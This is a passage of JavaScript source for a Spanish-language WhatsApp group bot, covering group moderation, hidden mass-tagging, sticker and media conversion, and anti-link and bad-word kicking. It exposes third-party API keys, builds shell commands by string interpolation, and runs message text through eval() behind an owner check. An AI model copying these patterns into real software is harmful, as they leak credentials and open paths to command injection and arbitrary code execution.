if (!linkgp) return reply('Y el link del grupo... onta!?')
samu330.query({
json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]
})
reply('Ya entre al grupo😉')
samu330.sendMessage(linkgp.gid, `*Hola* 🙋🏻‍♂️\nSoy Samu _(NyanBot)_, me an designado como *BOT* para este grupo🤖\n\n*Porfavor sige mis reglas, para leer mis reglas escribe:*\n${prefix}reglas\nPorfavor sigelas o atente a las consecuencias⚠\n*Quedo a su dispocicion, no me agan sentir mal.... por que yo tambien tengo corazon😣*`, MessageType.text)
break
case 'clearall':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
for (let chat of totalChat) {
await samu330.modifyChat(chat.jid, "delete")
}
await wa.sendFakeStatus(from, "Success clear all chat", "success")
break

case 'hidetag':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (!isAdmin && !isOwner && !itsMe) return await reply(mess.only.admin)
await wa.hideTag(from, args.join(" "))
break
case 'imagetag':
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin && !isOwner && !itsMe) return await reply(mess.only.admin)
if (!isQuotedImage && !isImage) return await reply(`Lalala... *cancion feliz*\nY la imagen pedazo de nada? >:/`)
mediatag = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
buffer = await samu330.downloadMediaMessage(mediatag)
await wa.hideTagImage(from, buffer)
break
case 'toimg':
if (!isQuotedSticker) return reply(`send sticker and reply with caption ${prefix}toimg`)
if (sam.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
reply(`Este comando solo sirve con stikers estaticos, para convertir un stiker a gif, usa: ${prefix}agif`)
} else {
var media1 = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var media2 = await samu330.downloadAndSaveMediaMessage(media1)
ran = getRandom('.png')
exec(`ffmpeg -i ${media2} ${ran}`, (err) => {
fs.unlinkSync(media2)
if (err) {
reply(`error\n\n${err}`)
fs.unlinkSync(ran)
} else {
buffer = fs.readFileSync(ran)
samu330.sendMessage(from, buffer, MessageType.image, {quoted: sam, caption: '𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒'})
fs.unlinkSync(ran)
}
})
}
break
case 'agif':
ger = isQuotedSticker ? JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
var imgbb = require('imgbb-uploader')
reply('*Espera un momento...*')
owgi = await samu330.downloadAndSaveMediaMessage(ger)
data = await imgbb("b0fc132474ca03ee7898fd5cac7275fe", owgi)
anu = await getJson(`https://api.lolhuman.xyz/api/convert/webptomp4?apikey=${api}&img=${data.display_url}`)
result = await getBuffer(anu.result)
samu330.sendMessage(from, result, video, {quoted: ftoko, caption: '𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒', mimetype: 'video/gif'})

break
case 'toptt':
reply(`wait..`)
var media1 = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var media2 = await samu330.downloadAndSaveMediaMessage(media1)
var ran = getRandom('.mp3')
exec(`ffmpeg -i ${media2} ${ran}`, (err) => {
fs.unlinkSync(media2)
if (err) return reply('error')
topt = fs.readFileSync(ran)
samu330.sendMessage(from, topt, MessageType.audio, {mimetype: 'audio/mp4', quoted: faud, ptt:true})
})
break
case 'stickertag':
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin && !isOwner && !itsMe) return await reply('This command only for admin')
if (!isQuotedImage && !isImage) return await reply('Etiqueta un stiker')
media = isQuotedSticker ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
buffer = await samu330.downloadMediaMessage(media)
await wa.hideTagSticker(from, buffer)
break
case 'promote':
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin) return await reply(mess.only.admin)
if (!botAdmin) return await reply('Botcito debe ser admin')
if (mentionUser.length == 0) return await reply('Tag member')
await wa.promoteAdmin(from, mentionUser)
await reply(`Tenemos nuevo Admin`)
break
case 'demote':
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin) return await reply(mess.only.admin)
if (!botAdmin) return await reply(mess.only.Badmin)
if (mentionUser.length == 0) return await reply('Tag member!')
await wa.demoteAdmin(from, mentionUser)
await reply(`jsjs un adm menos`)
break
case 'admin':
var textt = msg.admin(groupAdmins, groupName)
await wa.sendFakeStatus(from, textt, "LIST ADMIN", groupAdmins)
break
case 'link':
var link = await wa.getGroupInvitationCode(from)
await wa.sendFakeStatus(from, link, "El lik de este grupo es")
break
case 'grupo':
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin) return await reply(mess.only.admin)
if (!botAdmin) return await reply(mess.only.Badmin)
if (args[0] === 'abrir') {
samu330.groupSettingChange(from, GroupSettingChange.messageSend, false).then(() => {
wa.sendFakeStatus(from, "*Success open group*", "GROUP SETTING")
})
} else if (args[0] === 'cerrar') {
samu330.groupSettingChange(from, GroupSettingChange.messageSend, true).then(() => {
wa.sendFakeStatus(from, "*Succes close group*", "GROUP SETTING")
})
} else {
await reply(`Example: ${prefix}${command} open/close`)
}
break

case 'antileg':
				if (!isGroup) return reply('Este comando es solo para grupos')
					if (args.length < 1) return reply('escriba *1* para activar')
					if (args[0] === '1') {
						if (isAntiLeg) return reply('Ya esta activo')
						legion.push(from)
                                                fs.writeFileSync('./src/sm330Leg.json', JSON.stringify(legion))
						reply('*Modo simi activado✅*')
					} else if ((args[0]) === '0') {
						var ini = legion.indexOf(from)
						legion.splice(ini, 1)
						fs.writeFileSync('./src/sm330Leg.json', JSON.stringify(legion))
						reply('Antilegiones activado✔️')
					} else {
						reply('*1 para activar, 0 para desactivar*')
					}
					break
            case 'setnamegp':
                if (!isGroup) return await reply(mess.only.group)
                if (!isAdmin) return await reply(mess.only.admin)
                if (!botAdmin) return await reply(mess.only.Badmin)
                var newName = args.join(" ")
                samu330.groupUpdateSubject(from, newName).then(() => {
                    wa.sendFakeStatus(from, "El nombre del grupo se ah cambiao a" + newName, "GROUP SETTING")
                })
                break
            case 'setdesc':
                if (!isGroup) return await reply(mess.only.group)
                if (!isAdmin) return await reply(mess.only.admin)
                if (!botAdmin) return await reply(mess.only.Badmin)
                var newDesc = args.join(" ")
                samu330.groupUpdateDescription(from, newDesc).then(() => {
                    wa.sendFakeStatus(from, "La descripcion del grupo se ah cambiado a" + newDesc, "GROUP SETTING")
                })
		break
					case 'wasted':
					var imgbb = require('imgbb-uploader')
					if (((isMedia && !sam.message.videoMessage) || isQuotedImage) && args.length == 0) {
						ger = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam;
						reply(mess.wait);
						owgi = await samu330.downloadAndSaveMediaMessage(ger);
						anu = await imgbb('20a14861e4f7591f3dc52649cb07ae02', owgi);
						teks = `${anu.display_url}`;
						anu1 = await getBuffer(`https://some-random-api.ml/canvas/wasted?avatar=${teks}`);
						fs.writeFileSync('wasted.jpg', anu1)
						samu330.sendMessage(from, fs.readFileSync('wasted.jpg'), MessageType.image)
					} else {
						reply('Manda la foto!');
					}
				
					break
	case 'ger':
 	    if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
            var imgbb = require('imgbb-uploader')
           if ((isMedia && !sam.message.videoMessage || isQuotedImage) && args.length == 0) {
           ger = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
           reply('*Espera un momento porfavor*')
         owgi = await samu330.downloadAndSaveMediaMessage(ger)
           anu = await imgbb('20a14861e4f7591f3dc52649cb07ae02', owgi)
        teks = `${anu.display_url}`
         ranp = getRandom('.gif')
        rano = getRandom('.webp')
        anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`
       exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                                                fs.unlinkSync(ranp)
                                                if (err) return reply('*Uuuu, algo salio mal, intenta de nuevo*')
                                                nobg = fs.readFileSync(rano)
                                                samu330.sendMessage(from, nobg, sticker, {quoted: ftoko})
                                                fs.unlinkSync(rano)
                                        })
                                    
                                             } else {
                                                 reply('Se nececita una foto!')
                                          }
				
                                             break
	case 'antimedia':                
if (!isGroup) return reply(mess.only.group)
                                        if (!isAdmin) return reply(mess.only.admin)     
if (!botAdmin) return reply(mess.only.Badmin)
if (args.length < 1) return reply('Escribe *1* para activar')          
if (args[0] === '1') {                                    
	if (isAntiMedia) return reply('*Ya está activo*')          
	antimedia.push(from)                          
	fs.writeFileSync('./src/antimedia.json', JSON.stringify(antimedia))      
	reply(`*[ Activado ]*`)  
	reply(`*La persona que envie fotos o videos sera eliminada*`)  
} else if (args[0] === '0') {             
	var ini = antimedia.indexOf(from)
	antimedia.splice(ini, 1)           
	fs.writeFileSync('./src/antimedia.json', JSON.stringify(antimedia))       
	reply(`Desactivado`)              
} else {                                         
	reply('1 para activar, 0 para desactivar')           
}           
break
					case '+18':                
if (!isGroup) return reply(mess.only.group)
if (!isAdmin) return reply(mess.only.admin)     

if (args.length < 1) return reply('Escribe *1* para activar')          
if (args[0] === '1') {                                    
	if (isNsfw) return reply('*Ya está activo*')          
	nsfw.push(from)                          
	fs.writeFileSync('./src/nsfw.json', JSON.stringify(nsfw))      
	reply(`*[ Activado ]*`)   
} else if (args[0] === '0') {             
	var ini = nsfw.indexOf(from)
	nsfw.splice(ini, 1)           
	fs.writeFileSync('./src/nsfw.json', JSON.stringify(nsfw))       
	reply(`Desactivado`)              
} else {                                         
	reply('1 para activar, 0 para desactivar')           
}           
break
//by Sm330
case 'autostick':            
if (!isGroup) return reply(mess.only.group)
if (!isAdmin) return reply(mess.only.admin)     
if (args.length < 1) return reply('Escribe *1* para activar')                    
if (args[0] === '1') {                             
	if (isAutoSt) return reply('*Ya está activo*')          
	autostick.push(from)             
	fs.writeFileSync('./src/autostick.json', JSON.stringify(autostick))      
	reply(`*[ Activado ]*`)  
	reply(`*ahora, todas las fotos que se envien en el grupo se convertiran en sticker automaticamente*`)  
} else if (args[0] === '0') {           
	var ini = autostick.indexOf(from)
	autostick.splice(ini, 1)                  
	fs.writeFileSync('./src/autostick.json', JSON.stringify(autostick))      
	reply(`Desactivado`)              
} else {                                
	reply('1 para activar, 0 para desactivar')        
}                          
break
					
			case 'antibad':
                                        if (!isGroup) return reply(mess.only.group)
                                        if (!isAdmin) return reply(mess.only.admin)
					if (!botAdmin) return reply(mess.only.Badmin)
                                        if (args.length < 1) return reply('Escribe *1* para activar')
                                        if (args[0] === '1') {
                                                if (isBadWord) return reply('*Ya está activo*')
                 	                        badword.push(from)
                 	                        fs.writeFileSync('./src/badword.json', JSON.stringify(badword))
                  	                        reply(`*[ Activado ]*`)
						reply(`*Las personas que envien una mala palabra sera eliminada*. _Para ver la lista de malas palabras usa el comando: listbad_`)  
                                        } else if (args[0] === '0') {
                  	                        var ini = antibad.indexOf(from)
						badword.splice(ini, 1)
                 	                        fs.writeFileSync('./src/badword.json', JSON.stringify(badword))
                 	                        reply(`Desactivado`)
             	                        } else {
                 	                        reply('1 para activar, 0 para desactivar')
                	                }
                                        break
                                case 'addbad':
                                
                                        if (!isOwner) return reply(mess.only.ownerB)
                                        if (!isAdmin) return reply(mess.only.admin)
                                        if (args.length < 1) return reply( `Escribe ${prefix}addbad [palabra]. Ejemplo: ${prefix}addbad pto`)
                                        const bw = body.slice(12)
                                        bad.push(bw)
                                        fs.writeFileSync('./src/bad.json', JSON.stringify(bad))
                                        reply('Se añadio con exito')
				
                                        break
                                case 'delbad':
                                
                                        if (!isOwner) return reply(mess.only.ownerB)
                                        if (!isAdmin) return reply(mess.only.admin)
                                        if (args.length < 1) return reply( `Escribe ${prefix}delbad [palabra]. Ejemplo: ${prefix}delbad bego`)
                                        let dbw = body.slice(12)
                                        bad.splice(dbw)
                                        fs.writeFileSync('./src/bad.json', JSON.stringify(bad))
                                        reply('Se quito con exito')
				
                                        break 
                                case 'listbad':
                                
                                        let lbw = `Lista de BAD WORD\nTotal : ${bad.length}\n`
                                        for (let i of bad) {
                                                lbw += `◦ ${i.replace(bad)}\n`
                                        }
                                        await reply(lbw)
                                        break
					case 'antilink':
                                	if (!isGroup) return reply(mess.only.group)
					if (!isAdmin) return reply(mess.only.admin)
					if (!botAdmin) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('escriba *1* para activar')
					if (args[0] === '1') {
						if (isAntiLink) return reply('Ya esta activo')
						antilink.push(from)
						fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
						reply('*Anti-link activado ✔️*')
						samu330.sendMessage(from,`Los miembros que manden un link serán eliminados, *OJO* _CULAQUIER TIPO DE LINK_`, text)
					} else if ((args[0]) === '0') {
						var ini = antilink.indexOf(from)
						antilink.splice(ini, 1)
						fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
						reply('Anti-link desactivado ✔️')
					} else {
						reply('*1 para activar, 0 para desactivar*')
					}
					break
	case 'welcome':
					if (!isGroup) return reply('*Comando solo para grupos*')
					if (!isAdmin) return reply(mess.only.admin)
					if (args.length < 1) return reply('ah? que quieres hacer? *1* para activar y *2* para desactivar')
					if (Number(args[0]) === 1) {
						if (isWelkom) return reply('Ya esta activo')
						welkom.push(from)
						fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
						reply('Se activo con exito')
					} else if (Number(args[0]) === 0) {
						welkom.splice(from, 1)
						fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
						reply('Se desactivo con exito')
					} else {
						reply('1 para activar, 0 desactivar')
					}
                                      break
	case 'simsimi':   
				if (!isGroup) return reply('Este comando es solo para grupos')  
					if (args.length < 1) return reply('escriba *1* para activar')        
					if (args[0] === '1') {                 
						if (isSimi) return reply('Ya esta activo')            
						simi.push(from)
                                                fs.writeFileSync('./src/simi.json', JSON.stringify(simi))
						reply('*Modo simi activado✅*')
					} else if ((args[0]) === '0') {                      
						var ini = simi.indexOf(from)              
						simi.splice(ini, 1)                    
						fs.writeFileSync('./src/simi.json', JSON.stringify(simi))        
						reply('Modo simsimi off ✔️')                                   
					} else {                               
						reply('*1 para activar, 0 para desactivar*')             
					}



default:
if (body.startsWith(">")) {
if (!itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
return await reply(JSON.stringify(eval(args.join(" ")), null, 2))
}
if (isSimi && !itsMe &&  body != undefined){
res = await getJson(`https://api.simsimi.net/v1/?text=${body}&lang=es`)
reply(res.success)
}
if (isGroup && isAntiLink && isUrl(body) && !isAdmin && body != undefined) {
var sial = sender.split('@')[0] + "@s.whatsapp.net"
samu330.groupRemove(from, [sial])
}
}
} catch (e) {
console.log(chalk.greenBright("├"), chalk.keyword("yellow")("[  ERROR  ]"), chalk.keyword("red")(e))
}
})

